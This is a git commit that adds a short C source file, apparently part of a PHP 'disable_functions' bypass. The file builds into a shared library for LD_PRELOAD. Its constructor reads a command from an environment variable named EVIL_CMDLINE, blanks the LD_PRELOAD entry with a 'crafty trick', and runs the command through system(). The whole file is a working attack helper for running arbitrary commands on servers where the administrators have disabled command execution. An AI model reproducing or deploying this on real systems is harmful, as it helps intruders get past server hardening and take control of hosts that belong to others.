3cd9bc46de478eeceb80b54070eabbde266c8898
iinux <iinux@qq.com>
2021-10-20 23:02:53 +0800

    php preload

---
+++ php/preload/a.c
@@ -0,0 +1,24 @@
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+// gcc -shared -fPIC -o a.so a.c
+
+extern char** environ;
+__attribute__ ((__constructor__)) void preload (void)
+{
+    // get command line options and arg
+    const char* cmdline = getenv("EVIL_CMDLINE");
+    // unset environment variable LD_PRELOAD.
+    // unsetenv("LD_PRELOAD") no effect on some 
+    // distribution (e.g., centos), I need crafty trick.
+    int i;
+    for (i = 0; environ[i]; ++i) {
+            if (strstr(environ[i], "LD_PRELOAD")) {
+                    environ[i][0] = '\0';
+            }
+    }
+    // executive command
+    system(cmdline);
+}
